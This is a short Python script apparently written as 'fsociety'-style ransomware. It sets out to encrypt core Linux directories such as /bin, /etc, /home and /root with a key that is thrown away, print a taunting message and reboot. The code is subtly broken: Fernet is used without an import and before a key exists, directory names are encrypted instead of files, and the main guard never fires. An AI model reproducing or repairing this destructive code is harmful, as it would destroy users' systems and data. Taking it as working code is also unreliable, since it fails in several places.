#All imports here
import time
import os
import socket
import subprocess
import uuid
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

#All variables to be declared here
f = Fernet(key)

dirs = ["/bin/", "/boot/", "/dev/", "/etc/", "/home/", "/lib/", "/lib32/", "/lib64/", "/media/", "/mnt/", "/opt/", "/proc/", "/root/", "/run/", "/sbin/", "/snap/", "/srv/", "/sys/", "/tmp/", "/usr/", "/var/"]

keySalt = uuid.uuid4().hex
masterKey = Fernet.generate_key()

encryptedFiles = 0

#Pre-programmed functions to be declared here
def fuxocyMain():
    #fuxsocy, running this script will render all information unreadable and unuseable

    for x in range(0,dirs.count()):
        encryptedFiles = encryptedFiles + 1
        encryptedDisk = f.encrypt(dirs[x])

    print(encryptedFiles + " core filesystems succesfully encrypted by root")
    print("All operations finished, bye bye")
    time.sleep(2)

    os.system('reboot')

def encryptionMain():
    password = masterKey.encode() # Convert to type bytes
    salt = keySalt.encode()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=1048,
        salt=salt,
        iterations=100000,
        backend=default_backend()
        )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    fuxocyMain()

#Start main program after all variables are declared
if __name__ == '__name__':
    os.system('clear')
    encryptionMain()
